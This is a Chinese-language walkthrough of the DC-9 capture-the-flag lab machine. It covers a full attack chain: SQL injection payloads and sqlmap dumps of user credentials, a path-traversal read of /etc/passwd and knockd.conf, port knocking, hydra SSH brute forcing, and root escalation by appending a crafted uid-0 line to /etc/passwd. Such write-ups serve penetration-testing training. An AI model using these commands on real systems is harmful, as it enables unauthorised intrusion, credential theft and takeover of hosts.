# 信息搜集

1、端口探测

```bash
└─# nmap -A -sVC -O -p22,80 192.168.0.114 -oA nmap.txt
```

```bash
PORT   STATE    SERVICE VERSION
22/tcp filtered ssh
80/tcp open     http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Example.com - Staff Details - Welcome
MAC Address: 00:0C:29:07:26:F4 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
```

80 和 22 端口，22 端口显示 filtered ，这时要敏感以点，可能是我们需要什么条件才能打开 22 端口，比如 knock 了解一定的规则去敲门

2、80端口探测

<img src=".\图片\Snipaste_2023-07-02_15-55-01.png" alt="Snipaste_2023-07-02_15-55-01" style="zoom:67%;" />

有一处账号泄露点，留心把它们做成账号字典；还发现一处搜索功能，也可以试试注入

# web打点

## sql注入

发现

```
mary' && '1'='1               成功返回
mary' && '1'='2               返回无结果
```

<img src=".\图片\Snipaste_2023-07-02_15-59-15.png" alt="Snipaste_2023-07-02_15-59-15" style="zoom:80%;" />

### sqlmap梭哈

可以手工注入或自写 python ，但懒

用 -r 参数接文件名注入

```http
POST /results.php HTTP/1.1
Host: 192.168.0.114
Content-Length: 32
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.0.114
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.0.114/search.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

search=mary*
```

爆库爆表爆数据

```
sqlmap -r sql.txt --batch --dbs
sqlmap -r sql.txt --batch -D Staff -T Users --dump
sqlmap -r sql.txt --batch -D users -T UserDetails -dump
```

```
available databases [3]:
[*] information_schema
[*] Staff
[*] users

Database: Staff
Table: Users
[1 entry]
+--------+----------------------------------+----------+
| UserID | Password                         | Username |
+--------+----------------------------------+----------+
| 1      | 856f5de590ef37314e7c3bdf6f8a66dc | admin    |
+--------+----------------------------------+----------+

Database: users
Table: UserDetails
[17 entries]
+----+------------+---------------+---------------------+-----------+-----------+
| id | lastname   | password      | reg_date            | username  | firstname |
+----+------------+---------------+---------------------+-----------+-----------+
| 1  | Moe        | 3kfs86sfd     | 2019-12-29 16:58:26 | marym     | Mary      |
| 2  | Dooley     | 468sfdfsd2    | 2019-12-29 16:58:26 | julied    | Julie     |
| 3  | Flintstone | 4sfd87sfd1    | 2019-12-29 16:58:26 | fredf     | Fred      |
| 4  | Rubble     | RocksOff      | 2019-12-29 16:58:26 | barneyr   | Barney    |
| 5  | Cat        | TC&TheBoyz    | 2019-12-29 16:58:26 | tomc      | Tom       |
| 6  | Mouse      | B8m#48sd      | 2019-12-29 16:58:26 | jerrym    | Jerry     |
| 7  | Flintstone | Pebbles       | 2019-12-29 16:58:26 | wilmaf    | Wilma     |
| 8  | Rubble     | BamBam01      | 2019-12-29 16:58:26 | bettyr    | Betty     |
| 9  | Bing       | UrAG0D!       | 2019-12-29 16:58:26 | chandlerb | Chandler  |
| 10 | Tribbiani  | Passw0rd      | 2019-12-29 16:58:26 | joeyt     | Joey      |
| 11 | Green      | yN72#dsd      | 2019-12-29 16:58:26 | rachelg   | Rachel    |
| 12 | Geller     | ILoveRachel   | 2019-12-29 16:58:26 | rossg     | Ross      |
| 13 | Geller     | 3248dsds7s    | 2019-12-29 16:58:26 | monicag   | Monica    |
| 14 | Buffay     | smellycats    | 2019-12-29 16:58:26 | phoebeb   | Phoebe    |
| 15 | McScoots   | YR3BVxxxw87   | 2019-12-29 16:58:26 | scoots    | Scooter   |
| 16 | Trump      | Ilovepeepee   | 2019-12-29 16:58:26 | janitor   | Donald    |
| 17 | Morrison   | Hawaii-Five-0 | 2019-12-29 16:58:28 | janitor2  | Scott     |
+----+------------+---------------+---------------------+-----------+-----------+
```

留心并把得到的数据做成字典，awk 切割

```bash
└─# cat username_test.list | awk '{print $6}' > password.list
└─# cat username_test.list | awk '{print $11}' > username.list
```

并解密 admin 用户的密码，并可以登录网站后台

```
admin:transorbital1
```

并把这个也加入到账号密码本

## 后台文件包含

用 admin/transorbital1 这个得到的后台面登录网站

观察到 主页有一句重要的话

<img src=".\图片\Snipaste_2023-07-02_16-29-56.png" alt="Snipaste_2023-07-02_16-29-56" style="zoom:80%;" />

遇到这种情况可以尝试文件包含之类的，用 burp 来 fuzz 测试网站，字典用 seclists 里的 fuzz 字典

比如：

```
?filename=../../../../../etc/passwd
?file=../../../../../etc/passwd
?page=index.php
```

找到了  

```http
http://192.168.0.114/manage.php?file=../../../../../../etc/passwd
```

<img src=".\图片\Snipaste_2023-07-02_16-30-37.png" alt="Snipaste_2023-07-02_16-30-37" style="zoom:80%;" />

接下来仍然 fuzz 测试，可以查看端口敲门的策略 `/etc/konckd.conf`

```http
http://192.168.0.114/manage.php?file=../../../../../../etc/knockd.conf
```

<img src=".\图片\Snipaste_2023-07-02_16-40-18.png" alt="Snipaste_2023-07-02_16-40-18" style="zoom:67%;" />

## knock敲开端口

紧接上文，知道了 knock 的规则

用 nc 敲门也行

```
└─# knock 192.168.0.114 7469 8475  9842
```

再nmap查看22端口，就打开了

## ssh爆破

用上文中整理的字典

```bash
└─# hydra -L username.list -P password.list ssh://192.168.0.114
```

```
[22][ssh] host: 192.168.0.114   login: chandlerb   password: UrAG0D!
[22][ssh] host: 192.168.0.114   login: joeyt   password: Passw0rd
[22][ssh] host: 192.168.0.114   login: janitor   password: Ilovepeepee
```

随意登录一个看看

<img src=".\图片\Snipaste_2023-07-02_16-49-28.png" alt="Snipaste_2023-07-02_16-49-28" style="zoom:80%;" />

# 提权

登录之前收集到的 `janitor/Ilovepeepee` 用户，发现一些密码

```bash
janitor@dc-9:~/.secrets-for-putin$ cat passwords-found-on-post-it-notes.txt 
BamBam01
Passw0rd
smellycats
P0Lic#10-4
B4-Tru3-001
4uGU5T-NiGHts
```

同样把它们加入到 密码本

我们放到 `password.list` 中继续爆破尝试，发现多了两个用户，

```
 login: joeyt   password: Passw0rd
 login: janitor   password: Ilovepeepee
 login: chandlerb   password: UrAG0D!
 login: fredf   password: B4-Tru3-001

```

我们登录 `fredf`，看看 fredf 用户可以`NO Passwd`执行哪些 root 权限的文件

```bash
fredf@dc-9:~$ sudo -l
Matching Defaults entries for fredf on dc-9:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User fredf may run the following commands on dc-9:
    (root) NOPASSWD: /opt/devstuff/dist/test/test
```

观察 test 文件

```
-rwxr-xr-x 1 root root 1212968 Dec 29  2019 test
```

运行看看，提示使用 python test.py 加参数 运行！好像是 test.py 文件编译成的 可执行程序

```bash
fredf@dc-9:/opt/devstuff/dist/test$ ./test
Usage: python test.py read append
```

```bash
fredf@dc-9:/opt/devstuff/dist/test$ file test
test: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=28ba79c778f7402713aec6af319ee0fbaf3a8014, stripped
```

于是全村寻找 `test.py`

```bash
fredf@dc-9:/opt/devstuff/dist/test$ find / -name "test.py" 2>/dev/null
/opt/devstuff/test.py
```

看看 test.py 的逻辑，是把一个文件的内容复制追加到另一个文件中。于是我们可以自己生成一个账号密码，sudo 运行 test.py 以 root权限复制到 /etc/passwd 中

```bash
fredf@dc-9:/opt/devstuff/dist/test$ cat /opt/devstuff/test.py
#!/usr/bin/python

import sys

if len (sys.argv) != 3 :
    print ("Usage: python test.py read append")
    sys.exit (1)

else :
    f = open(sys.argv[1], "r")
    output = (f.read())

    f = open(sys.argv[2], "a")
    f.write(output)
    f.close()

```

## 步骤

1、本地生成密码

```bash
openssl passwd -1 -salt zf1yolo 123456
```

```
$1$zf1yolo$oULk89mtehUjxLPH9cRSn1
```

2、整理格式，把账号密码写入临时文件里

```
echo 'zf1yolo:$1$zf1yolo$oULk89mtehUjxLPH9cRSn1:0:0:root:/bin/bash' >> /tmp/zf1yolo
```

3、然后 sudo 运行 test 脚本

```bash
sudo ./test /tmp/zf1yolo /etc/passwd
```

4、切换到 zf1yolo 用户，成功得到 root 权限

```bash
fredf@dc-9:/opt/devstuff/dist/test$ su zf1yolo
Password: 
# id
uid=0(root) gid=0(root) groups=0(root)
```

<img src=".\图片\Snipaste_2023-07-02_21-17-28.png" alt="Snipaste_2023-07-02_21-17-28" style="zoom:80%;" />

# 总结

用 burp 测试 fuzz 大法，寻找到了 `?file=../../../../../../etc/passwd` 这样的文件包含

端口 显示为 `filter` 时，可尝试用 konck 按照一定规则给敲开，这个规则只能从之前的信息搜集获取了

留心寻找账号密码的信息，把它们做成账号密码本

sudo 提权




